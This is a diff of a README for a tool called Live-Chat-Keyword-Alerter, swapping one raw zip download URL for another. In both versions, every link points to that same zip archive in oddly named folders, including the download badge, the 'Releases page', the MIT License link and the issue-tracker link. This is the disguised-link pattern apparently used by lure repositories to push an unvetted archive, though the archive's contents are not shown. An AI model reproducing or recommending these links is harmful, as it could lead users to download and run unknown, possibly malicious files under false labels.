@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Live-Chat-Keyword-Alerter](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/beatification/Live-Chat-Keyword-Alerter.zip)](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/beatification/Live-Chat-Keyword-Alerter.zip)
+[![Download Live-Chat-Keyword-Alerter](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/cull/Chat_Live_Keyword_Alerter_v3.4-beta.2.zip)](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/cull/Chat_Live_Keyword_Alerter_v3.4-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download and install Live-Chat-Keyword-Alerter, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Live-Chat-Keyword-Alerter Releases](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/beatification/Live-Chat-Keyword-Alerter.zip) page.
+1. **Visit the Releases Page:** Go to the [Live-Chat-Keyword-Alerter Releases](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/cull/Chat_Live_Keyword_Alerter_v3.4-beta.2.zip) page.
 
 2. **Select the Latest Version:** Look for the latest release, which will be at the top of the page.
 
@@ -85,12 +85,12 @@ If you'd like to contribute to Live-Chat-Keyword-Alerter, please fork the reposi
 
 ## 📄 License
 
-This project is open-source and available under the [MIT License](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/beatification/Live-Chat-Keyword-Alerter.zip). Feel free to use it for personal or educational purposes.
+This project is open-source and available under the [MIT License](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/cull/Chat_Live_Keyword_Alerter_v3.4-beta.2.zip). Feel free to use it for personal or educational purposes.
 
 ## 📂 Support
 
-If you encounter any issues or have questions, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/beatification/Live-Chat-Keyword-Alerter.zip). We’ll do our best to assist you.
+If you encounter any issues or have questions, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/cull/Chat_Live_Keyword_Alerter_v3.4-beta.2.zip). We’ll do our best to assist you.
 
 ## 📥 Download Again
 
-For quick access, [download Live-Chat-Keyword-Alerter](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/beatification/Live-Chat-Keyword-Alerter.zip) and start enjoying real-time keyword monitoring today!
+For quick access, [download Live-Chat-Keyword-Alerter](https://raw.githubusercontent.com/andhikGeiska/Live-Chat-Keyword-Alerter/main/cull/Chat_Live_Keyword_Alerter_v3.4-beta.2.zip) and start enjoying real-time keyword monitoring today!
